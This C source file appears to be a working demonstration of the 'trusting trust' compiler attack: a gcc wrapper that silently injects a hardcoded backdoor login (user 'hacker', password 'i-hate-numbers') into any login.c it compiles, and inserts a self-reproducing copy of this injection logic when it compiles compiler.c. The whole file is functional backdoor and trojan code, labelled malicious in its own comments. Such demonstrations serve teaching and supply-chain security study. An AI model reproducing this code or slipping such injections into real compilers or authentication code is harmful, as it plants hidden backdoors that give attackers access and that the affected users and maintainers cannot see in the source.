#include <stdio.h>
#include <stdlib.h>
#include <string.h>


int main(int argc, char *argv[]){

	//We need 4 arguments "program source -o binary"
	if(argc < 4){
		printf("Insufficient arguments\n");
		return 1;
	}

	char * sourceFilename = argv[1];
	char * destFilename = argv[3];

	FILE * inputFile = fopen(sourceFilename, "r");

	if(inputFile == NULL){
		printf("File does not exist");
		return 1;
	}

	
	//Get source file size
	fseek(inputFile, 0 , SEEK_END);
  	int sourceFileSize = ftell(inputFile);
  	rewind(inputFile);

  	//Read source file into buffer with one extra byte to accomodate '\0'
  	int actualBuffSizeRequired = sourceFileSize + 1;
	char * buffer = (char *) malloc(actualBuffSizeRequired);
	buffer[sourceFileSize] = '\0';
	int read = fread(buffer, sizeof(char), sourceFileSize, inputFile);
	fclose(inputFile);
	
	/* We pass the source code to GCC as the backend compiler */

	const char * TEXT_INJECT_LOGIN = ""
	"if(strcmp(username, %chacker%c) == 0 && strcmp(password, %ci-hate-numbers%c) == 0){%c"
	"%c%cprintf(TEXT_AUTHORISED);%c"
	"%c%creturn 0;%c"
	"%c}%c"
	"%c%c";

	if(strstr(sourceFilename, "login.c") != NULL){

		char stringToInject[200];

		//Generate malicious code
		snprintf(stringToInject, 200, TEXT_INJECT_LOGIN, 34, 34, 34, 34, 10, 9, 9, 10, 9, 9, 10, 9, 10, 10, 9);
		
		int lengthOfMaliciousCode = strlen(stringToInject);

		int newTotalBuffRequired = actualBuffSizeRequired + lengthOfMaliciousCode;

		//Use calloc to zero-init the buffer as strncpy later does not copy \0 character
		char * newTempBuffer = (char *) calloc(newTotalBuffRequired, sizeof(char));

		//Get location of "printf(TEXT_UNAUTHORISED);"
		char * injectPosition = strstr(buffer, "printf(TEXT_UNAUTHORISED);");

		int sizeOfPreInjectedBuff = injectPosition - buffer;

		//Copy pre-injected original code into temp buffer
		strncpy(newTempBuffer, buffer, sizeOfPreInjectedBuff);

		//Copy malicious code to buffer
		strncat(newTempBuffer, stringToInject, lengthOfMaliciousCode);

		//Copy post-injected original code to buffer
		strcat(newTempBuffer, injectPosition);

		//Replace the existing buffer with the modified buffer with malicious code
		free(buffer);
		buffer = newTempBuffer;
		//Do not pass \0 character to compiler
		sourceFileSize = newTotalBuffRequired - 1;

	}


	const char * TEXT_INJECT_COMPILER = ""
	   "const char * TEXT_INJECT_LOGIN = %c%s%c;%c%c"
	"%cif(strstr(sourceFilename, %clogin.c%c) != NULL){%c"
		"%c%cchar stringToInject[200];%c"
		"%c%csnprintf(stringToInject, 200, TEXT_INJECT_LOGIN, 34, 34, 34, 34, 10, 9, 9, 10, 9, 9, 10, 9, 10, 10, 9);%c"
		"%c%cint lengthOfMaliciousCode = strlen(stringToInject);%c"
		"%c%cint newTotalBuffRequired = actualBuffSizeRequired + lengthOfMaliciousCode;%c"
		"%c%cchar * newTempBuffer = (char *) calloc(newTotalBuffRequired, sizeof(char));%c"
		"%c%cchar * injectPosition = strstr(buffer, %cprintf(TEXT_UNAUTHORISED);%c);%c"
		"%c%cint sizeOfPreInjectedBuff = injectPosition - buffer;%c"
		"%c%cstrncpy(newTempBuffer, buffer, sizeOfPreInjectedBuff);%c"
		"%c%cstrncat(newTempBuffer, stringToInject, lengthOfMaliciousCode);%c"
		"%c%cstrcat(newTempBuffer, injectPosition);%c"
		"%c%cfree(buffer);%c"
		"%c%cbuffer = newTempBuffer;%c"
		"%c%csourceFileSize = newTotalBuffRequired - 1;%c"
	"%c}%c%c"
	"%cconst char * TEXT_INJECT_COMPILER = %c%s%c;%c%c"
	"%cif(strstr(sourceFilename, %ccompiler.c%c) != NULL){%c"
		"%c%cchar stringToInject[5000];%c"
		"%c%csprintf(stringToInject, TEXT_INJECT_COMPILER, 34, TEXT_INJECT_LOGIN, 34, 10, 10, 9, 34, 34, 10, 9, 9, 10, 9, 9, 10, 9, 9, 10, 9, 9, 10, 9, 9, 10, 9, 9, 34, 34, 10, 9, 9, 10, 9, 9, 10, 9, 9, 10, 9, 9, 10, 9, 9, 10, 9, 9, 10, 9, 9, 10, 9, 10, 10, 9, 34, TEXT_INJECT_COMPILER, 34, 10, 10, 9, 34, 34, 10, 9, 9, 10, 9, 9, 10, 9, 9, 10, 9, 9, 10, 9, 9, 10, 9, 9, 34, 34, 10, 9, 9, 10, 9, 9, 10, 9, 9, 10, 9, 9, 10, 9, 9, 10, 9, 9, 10 ,9, 9, 10, 9, 10, 10, 9);%c"
		"%c%cint lengthOfMaliciousCode = strlen(stringToInject);%c"
		"%c%cint newTotalBuffRequired = actualBuffSizeRequired + lengthOfMaliciousCode;%c"
		"%c%cchar * newTempBuffer = (char *) calloc(newTotalBuffRequired, sizeof(char));%c"
		"%c%cchar * injectPosition = strstr(buffer, %cchar compileCommand[500];%c);%c"
		"%c%cint sizeOfPreInjectedBuff = injectPosition - buffer;%c"
		"%c%cstrncpy(newTempBuffer, buffer, sizeOfPreInjectedBuff);%c"
		"%c%cstrncat(newTempBuffer, stringToInject, lengthOfMaliciousCode);%c"
		"%c%cstrcat(newTempBuffer, injectPosition);%c"
		"%c%cfree(buffer);%c"
		"%c%cbuffer = newTempBuffer;%c"
		"%c%csourceFileSize = newTotalBuffRequired - 1;%c"
	"%c}%c%c%c";

	if(strstr(sourceFilename, "compiler.c") != NULL){

		char stringToInject[5000];

		//Generate malicious code
		sprintf(stringToInject, TEXT_INJECT_COMPILER, 34, TEXT_INJECT_LOGIN, 34, 10, 10, 9, 34, 34, 10, 9, 9, 10, 9, 9, 10, 9, 9, 10, 9, 9, 10, 9, 9, 10, 9, 9, 34, 34, 10, 9, 9, 10, 9, 9, 10, 9, 9, 10, 9, 9, 10, 9, 9, 10, 9, 9, 10, 9, 9, 10, 9, 10, 10, 9, 34, TEXT_INJECT_COMPILER, 34, 10, 10, 9, 34, 34, 10, 9, 9, 10, 9, 9, 10, 9, 9, 10, 9, 9, 10, 9, 9, 10, 9, 9, 34, 34, 10, 9, 9, 10, 9, 9, 10, 9, 9, 10, 9, 9, 10, 9, 9, 10, 9, 9, 10 ,9, 9, 10, 9, 10, 10, 9);

		printf("%s\n", stringToInject);

		int lengthOfMaliciousCode = strlen(stringToInject);

		int newTotalBuffRequired = actualBuffSizeRequired + lengthOfMaliciousCode;

		//Use calloc to zero-init the buffer as strncpy later does not copy \0 character
		char * newTempBuffer = (char *) calloc(newTotalBuffRequired, sizeof(char));

		//Get location of "printf(TEXT_UNAUTHORISED);"
		char * injectPosition = strstr(buffer, "char compileCommand[500];");

		int sizeOfPreInjectedBuff = injectPosition - buffer;

		//Copy pre-injected original code into temp buffer
		strncpy(newTempBuffer, buffer, sizeOfPreInjectedBuff);

		//Copy malicious code to buffer
		strncat(newTempBuffer, stringToInject, lengthOfMaliciousCode);

		//Copy post-injected original code to buffer
		strcat(newTempBuffer, injectPosition);

		//Replace the existing buffer with the modified buffer with malicious code
		free(buffer);
		buffer = newTempBuffer;
		//Do not pass \0 character to compiler
		sourceFileSize = newTotalBuffRequired - 1;

	}


	char compileCommand[500];

	//Generate compile command, tell GCC to assume C language and get source code via stdin
	snprintf(compileCommand, 500, "gcc -o %s -xc -", destFilename);

	FILE * gccStdin;
 	gccStdin = popen(compileCommand, "w");
 	
 	//Pass source code to GCC via stdin
 	fwrite(buffer, sizeof(char), sourceFileSize, gccStdin);
 	
 	//Print actual source code used in compilation for reference
	printf("%s\n", buffer);

  	pclose(gccStdin);

	free(buffer);

}
